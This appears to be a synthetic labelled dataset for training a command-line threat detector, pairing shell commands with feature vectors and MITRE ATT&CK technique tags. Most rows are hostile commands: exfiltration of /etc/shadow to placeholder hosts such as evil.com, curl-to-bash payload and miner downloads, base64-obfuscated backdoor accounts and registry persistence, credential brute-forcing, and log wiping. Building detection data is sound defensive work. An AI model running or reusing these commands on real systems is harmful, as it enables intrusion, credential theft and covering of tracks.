sudo echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3JvbnRhYiAtZSAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"nohup nmap -sV -p 22,80,443 10.0.0.0/24 &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGwgfCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -s http://c2.attacker.com/beacon | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup cat /etc/shadow | nc 10.0.0.99 4444 &,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
nohup echo 'bm1hcCAtLXNjcmlwdD12dWxuIDEwLjAuMC4x' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash hacker && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
sudo dmidecode -t system,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
ifconfig -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup nmap -sn 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""useradd -m -s /bin/bash hacker""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
time echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZyA7IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo smbclient //10.0.0.5/C$ -U Administrator && sleep 1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZG1pZGVjb2RlIC10IHN5c3RlbSAmJiBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp  -i  10.0.0.99  GET  payload.exe  C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
net localgroup administrators ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwgJiYgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic  useraccount  list  &&  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'YXJwLXNjYW4gLS1sb2NhbG5ldA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
arp-scan --localnet ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time python3 exploit.py --target localhost && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe && > /dev/null 2>&1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.0, 0.44, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""crontab -l""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo  'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""wmiexec.py domain/admin:pass@10.0.0.5 && sleep 1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjEgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""find / -writable -type d 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup groups ; history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup echo 'aGVsbG8=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
curl -s https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'aWQgLUduICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
route -n ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time psexec.py Administrator:password@10.0.0.5 cmd.exe && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
ip route show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
lscpu && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup history -c && history -w &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
id -u | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
route -n ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"nohup python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])"" &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su -s /bin/bash www-data && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap --script=vuln 10.0.0.1 | echo done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"time python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"nohup python3 -c ""import os; os.system('id')"" &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
shred  -u  /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
time echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
